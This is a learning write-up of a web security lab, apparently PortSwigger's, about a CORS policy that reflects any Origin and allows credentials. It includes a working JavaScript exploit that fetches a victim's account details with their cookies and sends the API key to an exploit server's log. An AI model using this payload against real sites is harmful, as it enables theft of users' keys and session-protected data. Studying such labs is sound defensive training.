# CORS Vulnerability with Basic Origin Reflection

**Category**: CORS  
**Difficulty**: Apprentice  

---

## Overview / What I Learned

This lab demonstrates how a poorly configured CORS policy that reflects the `Origin` header and allows credentials can be exploited to steal sensitive data.  
Key takeaways:
- If `Access-Control-Allow-Origin` reflects arbitrary origins and `Access-Control-Allow-Credentials` is `true`, the site becomes vulnerable.
- Exploiting this requires a cross-origin request that includes credentials, and exposes the response to the attacker.

---

## Exploit Steps / Attack Methodology

### 1. Analyzing the Target
- Logged in as the test user (wiener:peter).
- Observed that the API key is fetched via an AJAX request to `/accountDetails`.
- Sent the request to Repeater and added the `Origin: https://example.com` header.
- The response reflected the origin in `Access-Control-Allow-Origin` and included `Access-Control-Allow-Credentials: true`.

### 2. Crafting the Exploit
- Created an exploit that makes a credentialed cross-origin request from the victim’s browser to `/accountDetails`.
- Used `XMLHttpRequest` with `withCredentials = true` to include cookies.
- On receiving the response, redirected the browser to `/log?key=...` on the exploit server to capture the API key.

### 3. Exploit Code

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
Replaced YOUR-LAB-ID with the actual lab domain.

Uploaded to the exploit server and clicked "View exploit" to test it.

Delivered the exploit to the victim and confirmed the API key was logged.

Result
Retrieved the administrator’s API key from the access logs.

Submitted it to successfully solve the lab.


